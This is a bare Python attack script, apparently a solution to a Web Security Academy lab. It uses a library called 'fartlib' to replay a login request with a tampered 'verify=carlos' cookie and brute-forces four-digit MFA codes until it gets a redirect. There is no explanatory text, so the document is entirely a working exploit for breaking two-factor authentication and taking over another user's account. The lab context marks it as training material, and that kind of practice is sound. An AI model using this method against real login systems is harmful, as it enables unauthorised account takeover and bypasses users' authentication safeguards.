import time

from fartlib import *

req = FartRequest("""
POST /login2 HTTP/1.1
Host: 0a1b00e90482ca6dc11d941600fd0043.web-security-academy.net
Cookie: session=AMlaGeS6KZnEFKhR3VEcsKwlZGdsKKzs; verify=carlos
Content-Length: 13
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Origin: https://0a1b00e90482ca6dc11d941600fd0043.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1b00e90482ca6dc11d941600fd0043.web-security-academy.net/login2
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

mfa-code=mfa_code
""")

codes = [str(x).zfill(4) for x in range(2000)]
start = time.time()
response = HttpWorker(req.substitute(mfa_code=codes), show_progress=True).get_first(
    lambda resp: resp.status_code == 302)
print(time.time() - start)
print(list(response.raw_response.headers.values()))
